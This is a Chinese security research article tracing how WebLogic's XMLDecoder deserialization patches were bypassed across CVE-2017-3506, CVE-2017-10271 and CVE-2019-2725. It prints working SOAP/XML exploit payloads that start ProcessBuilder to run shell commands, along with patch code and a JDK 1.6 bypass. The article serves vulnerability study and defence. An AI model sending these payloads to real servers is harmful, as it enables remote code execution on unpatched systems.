> 原文链接: https://www.anquanke.com//post/id/180725 


# 浅谈Weblogic反序列化——XMLDecoder的绕过史


                                阅读量   
                                **227969**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t017103f82dc8a4fc87.png)](https://p1.ssl.qhimg.com/t017103f82dc8a4fc87.png)



从CVE-2017-3506为起点至今，weblogic接二连三的吧爆出了大量的反序列化漏洞，而这些反序列化漏洞的很大一部分，都是围绕着XMLDecoder的补丁与补丁的绕过展开的，所以笔者以CVE-2017-3506为起点，到近期的CVE-2019-2725及其绕过来谈一谈这两年weblogic在XMLDecoder上的缝缝补补。



## 认识XMLDecoder

首先去看一下XMLDecoder的官方文档，如下：

XMLDecoder 类用于读取使用 XMLEncoder 创建的 XML 文档，用途类似于 ObjectInputStream。例如，用户可以使用以下代码片段来读取以 XML 文档形式（通过 XMLEncoder 类写入）定义的第一个对象：



```
XMLDecoder d = new XMLDecoder(new BufferedInputStream(new FileInputStream("Test.xml")));

Object result = d.readObject();

d.close();
```

作为一名java反序列化的研究人员，看到readObject()函数就应该带有一丝兴奋，至少代表我们找到入口了。

先不去管在weblogic上的利用，我们先构造一个特殊的poc.xml文件，让XMLDecoder去解析一下，看一下流程

```
&lt;java&gt;
    &lt;object class="java.lang.ProcessBuilder"&gt;
        &lt;array class="java.lang.String" length="3"&gt;
            &lt;void index="0"&gt;
                &lt;string&gt;/bin/bash&lt;/string&gt;
            &lt;/void&gt;
            &lt;void index="1"&gt;
                &lt;string&gt;-c&lt;/string&gt;
            &lt;/void&gt;
            &lt;void index="2"&gt;
                &lt;string&gt;ls&lt;/string&gt;
            &lt;/void&gt;
        &lt;/array&gt;
        &lt;void method="start"/&gt;
    &lt;/object&gt;
&lt;/java&gt;
```

再写一个简单的利用XMLDecoder解析xml文件的demo，

```
import java.beans.XMLDecoder;
import java.io.*;

public class Main `{`
    public static void main(String[] args) throws IOException, InterruptedException `{`
        File file = new File("poc.xml");
        XMLDecoder xd = null;
        try `{`
            xd = new XMLDecoder(new BufferedInputStream(new FileInputStream(file)));
        `}` catch (Exception e) `{`
            e.printStackTrace();
        `}`
        Object s2 = xd.readObject();
        xd.close();

    `}`
`}`
```

因为会触发命令执行，所以先直接在ProcessBuilder的start函数上打上断点，看一下调用栈，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1020_1024_/t011f16a31dfe649e21.png)

我们关注的重点在于从xml到ProcessBuilder类被实例化的过程，所以去跟进一下DocumentHandler类，我们去看几个核心函数，

首先看到了构造函数，看一看到为不同的标签定义了不同的Handler，

[![](https://p5.ssl.qhimg.com/dm/1024_722_/t0179f470f991ca7537.png)](https://p5.ssl.qhimg.com/dm/1024_722_/t0179f470f991ca7537.png)

再看一下startElement函数，它用来实例化对应的Element，并给当前handler设置Owner和Parent，关于Owner和Parent，直接引用@fnmsd写的内容：

parent

最外层标签的ElementHandler的parent为null，而后依次为上一级标签对应的ElementHandler。

owner

ElementHandler: 固定owner为所属DocumentHandler对象。

DocumentHandler: owner固定为所属XMLDecoder对象。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_228_/t013fd52be7382328c9.png)

然后看一下endElement函数，

[![](https://p3.ssl.qhimg.com/dm/1024_240_/t0166d9a2535ce2aa21.png)](https://p3.ssl.qhimg.com/dm/1024_240_/t0166d9a2535ce2aa21.png)

他会直接调用对应的ElementHandler的endElement函数，代码如下，

[![](https://p1.ssl.qhimg.com/dm/1024_521_/t0164c722b3507a83ef.png)](https://p1.ssl.qhimg.com/dm/1024_521_/t0164c722b3507a83ef.png)

接下来一连串的Handler的getValueObject调用之后，到达了ObjectElementHandler的getValueObject函数，并在该函数内将我们标签内的值传给了Expression类，

[![](https://p4.ssl.qhimg.com/dm/1024_650_/t013b0ae8967efa78a6.png)](https://p4.ssl.qhimg.com/dm/1024_650_/t013b0ae8967efa78a6.png)

在调用了getValue方法后，成功将ProcessBuilder类的实例返回，

[![](https://p1.ssl.qhimg.com/dm/1024_599_/t01a6ba83d8842d74ea.png)](https://p1.ssl.qhimg.com/dm/1024_599_/t01a6ba83d8842d74ea.png)

接下来再返回给VoidElementHandler将start函数传过来，调用start函数，命令执行成功。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_508_/t0150c9bcc6e5bd643b.png)

最后补上一张@ fnmsd给出的XMLDecoder解析xml的流程图以加深理解。

[![](https://p5.ssl.qhimg.com/dm/1024_579_/t01ba74c95a52f443e0.png)](https://p5.ssl.qhimg.com/dm/1024_579_/t01ba74c95a52f443e0.png)



## CVE-2017-3506

上一节已经可以看到，XMLDecoder在解析xml的时候，通过构造特殊的xml文件是可以造成命令执行的，接下来我们就可以来看一下第一个weblogic由于XMLDEcoder导致的命令执行漏洞CVE-2017-3506。

先上POC，

```
&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
    &lt;soapenv:Header&gt;
        &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
            &lt;java&gt;
                &lt;object class="java.lang.ProcessBuilder"&gt;
                    &lt;array class="java.lang.String" length="3"&gt;
                        &lt;void index="0"&gt;
                            &lt;string&gt;/bin/bash&lt;/string&gt;
                        &lt;/void&gt;
                        &lt;void index="1"&gt;
                            &lt;string&gt;-c&lt;/string&gt;
                        &lt;/void&gt;
                        &lt;void index="2"&gt;
                            &lt;string&gt; open /Applications/Calculator.app/&lt;/string&gt;
                        &lt;/void&gt;
                    &lt;/array&gt;
                    &lt;void method="start"/&gt;
                &lt;/object&gt;
            &lt;/java&gt;
        &lt;/work:WorkContext&gt;
    &lt;/soapenv:Header&gt;
    &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
```

调用链我们只跟到XMLDecoder.readObject()，因为剩下的都是上一节的内容了，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_923_/t01290d823d000263bb.png)

在processRequest函数中，会对传入的payload进行分割，把真正的xml交给readHeaderOld函数处理，

[![](https://p3.ssl.qhimg.com/dm/1024_312_/t0149c9960766115496.png)](https://p3.ssl.qhimg.com/dm/1024_312_/t0149c9960766115496.png)

readHeaderOld函数则是将真正的xml传给XMLDecoder，并在后续的一连串调用中将XMLDecoder实例化调用其readObject函数，于是便造成了命令执行。

[![](https://p5.ssl.qhimg.com/dm/1024_331_/t01660889f1604bd0bc.png)](https://p5.ssl.qhimg.com/dm/1024_331_/t01660889f1604bd0bc.png)



## CVE-2017-10271

在CVE-2017-3506爆出后，我们去看一下官方的补丁，代码如下：

```
private void validate(InputStream is) `{`

      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();

      try `{`

         SAXParser parser = factory.newSAXParser();

         parser.parse(is, new DefaultHandler() `{`

            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException `{`

               if(qName.equalsIgnoreCase("object")) `{`

                  throw new IllegalStateException("Invalid context type: object");

               `}`

            `}`

         `}`);

      `}` catch (ParserConfigurationException var5) `{`

         throw new IllegalStateException("Parser Exception", var5);

      `}` catch (SAXException var6) `{`

         throw new IllegalStateException("Parser Exception", var6);

      `}` catch (IOException var7) `{`

         throw new IllegalStateException("Parser Exception", var7);

      `}`

   `}`
```

补丁非常的简单，一旦标签是object，系统报错，于是立马出了第二版的poc，CVE-2017-10271：

```
&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
    &lt;soapenv:Header&gt;
        &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
            &lt;java&gt;
                &lt;void class="java.lang.ProcessBuilder"&gt;
                    &lt;array class="java.lang.String" length="3"&gt;
                        &lt;void index="0"&gt;
                            &lt;string&gt;/bin/bash&lt;/string&gt;
                        &lt;/void&gt;
                        &lt;void index="1"&gt;
                            &lt;string&gt;-c&lt;/string&gt;
                        &lt;/void&gt;
                        &lt;void index="2"&gt;
                            &lt;string&gt; open /Applications/Calculator.app/&lt;/string&gt;
                        &lt;/void&gt;
                    &lt;/array&gt;
                    &lt;void method="start"/&gt;
                &lt;/void&gt;
            &lt;/java&gt;
        &lt;/work:WorkContext&gt;
    &lt;/soapenv:Header&gt;
    &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
```

乍一看这个poc，简直和CVE-2017-3506一模一样，唯一得到区别就是

&lt;object class=”java.lang.ProcessBuilder”&gt;变成了

&lt;void class=”java.lang.ProcessBuilder”&gt;

仅仅是类的标签类型由object变成了void，我们去看一下VoidElementHandler的源码：

[![](https://p1.ssl.qhimg.com/t0183b6c64f75db30ec.png)](https://p1.ssl.qhimg.com/t0183b6c64f75db30ec.png)

可以看到VoidElementHandler是ObjectElementHandler类的子类，这也就解释了为什么把object标签换成Void标签也同样可以造成命令执行。



## CVE-2019-2725

时隔一年多，CVE-2019-2725爆出，这次的漏洞是要分两块来看的，
1. 新爆出的存在反序列化的组件_async
1. CVE-2017-10271的补丁被绕过
首先看第一点，在ProcessBuilder的start函数上打一个断点，先看一下async组件在处理xml时候的调用链（老规矩只追到XMLDecoder.readObject函数），

[![](https://p1.ssl.qhimg.com/dm/1024_980_/t01baca8c10e69b2d4c.png)](https://p1.ssl.qhimg.com/dm/1024_980_/t01baca8c10e69b2d4c.png)

引用廖大神的分析思路，请求会经过webservice注册的21个Handler来处理，看一下HandlerIterator类，就能发现对应的21个Handler，

[![](https://p0.ssl.qhimg.com/dm/1024_375_/t0169297b332b813621.png)](https://p0.ssl.qhimg.com/dm/1024_375_/t0169297b332b813621.png)

21个Handler里面AsyncResponseHandler应该是我们重点关注的那一个，跟进去看一下源码的handleRequest方法，

[![](https://p5.ssl.qhimg.com/dm/1024_456_/t0189505fb983a48c79.png)](https://p5.ssl.qhimg.com/dm/1024_456_/t0189505fb983a48c79.png)

可以看到要想让程序往下走，必须保证var2有值，也就是RelatesTo有值，这也就是为什么payload里面有

&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;

&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;

这两行的原因。

关于WS-Addressing的使用，也可以去参考官方文档（[https://www.w3.org/Submission/ws-addressing/](https://www.w3.org/Submission/ws-addressing/)），有助于深刻理解。

走过各种Handler后来到WorkAreaServerHandler，对xml进行了拆分，接下来的调用就和前面一样了（xml交给XMLDecoder，调用readObject方法），

[![](https://p5.ssl.qhimg.com/dm/1024_440_/t01c82f8af359b0c01b.png)](https://p5.ssl.qhimg.com/dm/1024_440_/t01c82f8af359b0c01b.png)

分析完async组件后，就来到了另一个问题上，如何绕过CVE-2017-10271的补丁，老套路，我们先看一下补丁内容，

```
private void validate(InputStream is) `{`

      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();

      try `{`

         SAXParser parser = factory.newSAXParser();

         parser.parse(is, new DefaultHandler() `{`

            private int overallarraylength = 0;

            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException `{`

               if(qName.equalsIgnoreCase("object")) `{`

                  throw new IllegalStateException("Invalid element qName:object");

               `}` else if(qName.equalsIgnoreCase("new")) `{`

                  throw new IllegalStateException("Invalid element qName:new");

               `}` else if(qName.equalsIgnoreCase("method")) `{`

                  throw new IllegalStateException("Invalid element qName:method");

               `}` else `{`

                  if(qName.equalsIgnoreCase("void")) `{`

                     for(int attClass = 0; attClass &lt; attributes.getLength(); ++attClass) `{`

                        if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) `{`

                           throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));

                        `}`

                     `}`

                  `}`

                  if(qName.equalsIgnoreCase("array")) `{`

                     String var9 = attributes.getValue("class");

                     if(var9 != null &amp;&amp; !var9.equalsIgnoreCase("byte")) `{`

                        throw new IllegalStateException("The value of class attribute is not valid for array element.");

                     `}`
```

这次的补丁内容我们文字化一下：
1. 禁用object、new、method标签
1. 如果使用void标签，只能有index属性
1. 如果使用array标签，且标签使用的是class属性，则它的值只能是byte
这次的补丁可以说是比上一次严格的多，前两点虽然很大程度上限制了我们不能随意生成对象，调用方法，但好在还有一个class标签可以使用，最关键的还在于第三点，它限制了我们的参数不能再是String类型，而只能是byte类型，所以我们的思路只能从这一点出发，整理一下思路，我们要寻找的是这样一个类：
1. 他的成员变量是byte类型
1. 在该类进行实例化的时候就能造成命令执行。
于是便有了oracle.toplink.internal.sessions.UnitOfWorkChangeSet来满足我们的需求。

看一下构造函数，该类会对传给它的byte值进行反序列化，可以看到这是一个标准的二次反序列化，于是满足二次反序列的payload应该都可以用，如AbstractPlatformTransactionManager、7u21等等。

[![](https://p2.ssl.qhimg.com/dm/1024_192_/t011c64761dda4c67de.png)](https://p2.ssl.qhimg.com/dm/1024_192_/t011c64761dda4c67de.png)

具体payload如下:

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
    &lt;soapenv:Header&gt;
        &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
            &lt;java&gt;&lt;class&gt;&lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;&lt;void&gt;&lt;array class="byte" length="8970"&gt;
                &lt;void index="0"&gt;
                &lt;byte&gt;-84&lt;/byte&gt;
                ...
                ...
            &lt;/array&gt;&lt;/void&gt;&lt;/class&gt;
            &lt;/java&gt;
        &lt;/work:WorkContext&gt;
    &lt;/soapenv:Header&gt;
    &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
```

关于二次反序列的原理不再一一分析，大佬们早已经给出了非常详尽的解释，有兴趣可以去廖大神的博客（[http://xxlegend.com）学习一下，也可以选择读一下ysoserial的7u21](http://xxlegend.com%EF%BC%89%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E9%80%89%E6%8B%A9%E8%AF%BB%E4%B8%80%E4%B8%8Bysoserial%E7%9A%847u21)模块代码就ok。

针对此次漏洞，官方给出的修复补丁处理比较简单，禁用class标签。

```
private void validate(InputStream is) `{`

   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();

   try `{`

      SAXParser parser = factory.newSAXParser();

      parser.parse(is, new DefaultHandler() `{`

         private int overallarraylength = 0;

         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException `{`

            if (qName.equalsIgnoreCase("object")) `{`

               throw new IllegalStateException("Invalid element qName:object");

            `}` else if (qName.equalsIgnoreCase("class")) `{`

               throw new IllegalStateException("Invalid element qName:class");

            `}` else if (qName.equalsIgnoreCase("new")) `{`

               throw new IllegalStateException("Invalid element qName:new");

            `}` else if (qName.equalsIgnoreCase("method")) `{`

               throw new IllegalStateException("Invalid element qName:method");

            `}` else `{`

               if (qName.equalsIgnoreCase("void")) `{`

                  for(int i = 0; i &lt; attributes.getLength(); ++i) `{`

                     if (!"index".equalsIgnoreCase(attributes.getQName(i))) `{`

                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(i));

                     `}`

                  `}`

               `}`

               if (qName.equalsIgnoreCase("array")) `{`

                  String attClass = attributes.getValue("class");

                  if (attClass != null &amp;&amp; !attClass.equalsIgnoreCase("byte")) `{`

                     throw new IllegalStateException("The value of class attribute is not valid for array element.");

                  `}`

                  String lengthString = attributes.getValue("length");

                  if (lengthString != null) `{`

                     try `{`

                        int length = Integer.valueOf(lengthString);

                        if (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) `{`

                           throw new IllegalStateException("Exceed array length limitation");

                        `}`

                        this.overallarraylength += length;

                        if (this.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) `{`

                           throw new IllegalStateException("Exceed over all array limitation.");

                        `}`
```

不过7u21模块有一点要提一下，7u21模块利用的最后会通过将TemplatesImpl对象的_bytecodes变量动态生成为对象，于是该类的static block和构造函数便会自动执行，而这个类又是攻击者可以随便构造的，于是便造成了命令执行。

由于此次漏洞的payload是byte写的，而由于攻击利用类又是动态生成的，所以分析攻击者的代码是个比较麻烦的事情，所以下面给出如何将payload中攻击者代码还原出来的方法。
1. 开启weblogic远程调试，并把断点打在ProcessBuilder类的start函数中（因为此时攻击类已经动态生成成功，但是没法直接在编译器里查看代码）
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_473_/t01bb7b2f0c462b898a.png)
1. 使用jps -l命令查看weblogic的pid
[![](https://p1.ssl.qhimg.com/t01e408b88c22aed112.png)](https://p1.ssl.qhimg.com/t01e408b88c22aed112.png)

3、运行sudo java -cp $JAVA_HOME/lib/sa-jdi.jar sun.jvm.hotspot.HSDB命令查看对应PID的内存，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_695_/t01b4e507f973da4eb9.png)

4、搜索内存中的动态生成类，并生成class文件，反编译一下，就可以看到攻击者写的自定义类了。

[![](https://p2.ssl.qhimg.com/dm/1024_725_/t0132abbb1af6d27228.png)](https://p2.ssl.qhimg.com/dm/1024_725_/t0132abbb1af6d27228.png)



## CVE-2019-2725绕过

最近网上又流传了CVE-2019-2725绕过的poc，如下：

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;
    &lt;soapenv:Header&gt;
        &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
            &lt;java&gt;
                &lt;array method="forName"&gt;
                    &lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;
                    &lt;void&gt;
                        &lt;array class="byte" length="3748"&gt;
                            ...
                        &lt;/array&gt;
                    &lt;/void&gt;
                &lt;/array&gt;
            &lt;/java&gt;
        &lt;/work:WorkContext&gt;
    &lt;/soapenv:Header&gt;
    &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
```

刚拿到poc的时候，看了一下思路，因为&lt;class&gt;标签被禁了，所以通过

&lt;array method=”forName”&gt;来绕过补丁。思路是比较清晰的，通过Class.forName(classname)来取到我们想要的类，从而绕过class标签被禁的问题。

但刚看到这个poc的时候，我第一个疑问就是，array居然可以使用method属性吗？所以立马去看了一下ArrayElementHandler类的内容，

[![](https://p3.ssl.qhimg.com/t011612fab5c199d572.png)](https://p3.ssl.qhimg.com/t011612fab5c199d572.png)

只支持length标签，但是它是NewElementHandler的子类，那再去看看NewElementHandler

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012facb5cd8fd7d1f7.png)

支持class标签，但是它是ElementHandler的子类，再去看一下ElementHandler

[![](https://p0.ssl.qhimg.com/dm/1024_200_/t01adb60981f479702d.png)](https://p0.ssl.qhimg.com/dm/1024_200_/t01adb60981f479702d.png)

发现到最后也没找到它支持method属性。

马上去我自己的环境里面试一下，没法复现成功，一度以为这个poc是假的，但后来想了一下，我的环境里面只有1.7和1.8的jdk，会不会是jdk版本太高了，立马去1.6试一下，果然复现成功，看来1.6的XMLDecoder的代码和1.7\1.8不太一样。

[![](https://p4.ssl.qhimg.com/dm/1024_388_/t01a8ee075d73e122fb.png)](https://p4.ssl.qhimg.com/dm/1024_388_/t01a8ee075d73e122fb.png)

去跟进一下jdk 1.6的XMLDecoder，根据原理去写一个简单一点的poc.xml，测试demo继续使用第一章的就行

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java&gt;
    &lt;array method="forName"&gt;
        &lt;string&gt;java.lang.ProcessBuilder&lt;/string&gt;
        &lt;void&gt;
        &lt;array class="java.lang.String" length="3"&gt;
            &lt;void index="0"&gt;
                &lt;string&gt;/bin/bash&lt;/string&gt;
            &lt;/void&gt;
            &lt;void index="1"&gt;
                &lt;string&gt;-c&lt;/string&gt;
            &lt;/void&gt;
            &lt;void index="2"&gt;
                &lt;string&gt;open /Applications/Calculator.app/&lt;/string&gt;
            &lt;/void&gt;
        &lt;/array&gt;
        &lt;void method="start" /&gt;
        &lt;/void&gt;
    &lt;/array&gt;
&lt;/java&gt;
```

发现jdk1.6的XMLDecoder代码简单很多，根本没有那么多的ElementHandler，直接统一放在ObjectHandler的代码里面处理。

而对标签的处理，也可以说是非常的朴实无华了，看一下startElement，



```
public void startElement(String var1, AttributeList var2) throws SAXException `{`
    ...

...

        String var8 = (String)var3.get("method");
        if (var8 == null &amp;&amp; var6 == null) `{`
            var8 = "new";
        `}`

        var4.setMethodName(var8);
     ...

...
        `}` else if (var1 == "array") `{`
            var14 = (String)var3.get("class");
            Class var10 = var14 == null ? Object.class : this.classForName2(var14);
            var11 = (String)var3.get("length");
            if (var11 != null) `{`
                var4.setTarget(Array.class);
                var4.addArg(var10);
                var4.addArg(new Integer(var11));
            `}`
```

我这里只截取关键部分代码，首先可以看到代码根本不管你的标签是什么，只要有methond属性，那就算作你的方法名，并且如果你的标签是array标签，而有没有class属性，自动给你补一个Class，完美契合需求，所以就可以直接通过Class.forName来取到我们需要的类了。

这样也就绕过了对class标签的过滤，不过只能在1.6的jdk利用。



## 思考与总结

根据近些年weblogic由于XMLDecoder导致的反序列漏洞的缝缝补补中，可以看到虽然绕过的poc层出不穷，但是利用的范围却越来越窄，从一开始的所有jdk通用，到7u21以下可以利用成功，再到最近的绕过已经只能在1.6利用成功，可以看到，保持jdk版本的高版本可以有效的防范java反序列化攻击。与此同时，对于基本用不到的weblogic组件，还是能删就删为好。



## 引用

[http://www.lmxspace.com/2019/06/05/Xmldecoder%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/](http://www.lmxspace.com/2019/06/05/Xmldecoder%25E5%25AD%25A6%25E4%25B9%25A0%25E4%25B9%258B%25E8%25B7%25AF/)

[https://blog.csdn.net/fnmsd/article/details/89889144](https://blog.csdn.net/fnmsd/article/details/89889144)

[http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/](http://xxlegend.com/2017/12/23/Weblogic%2520XMLDecoder%2520RCE%25E5%2588%2586%25E6%259E%2590/)

[http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/](http://xxlegend.com/2019/04/30/CVE-2019-2725%25E5%2588%2586%25E6%259E%2590/)
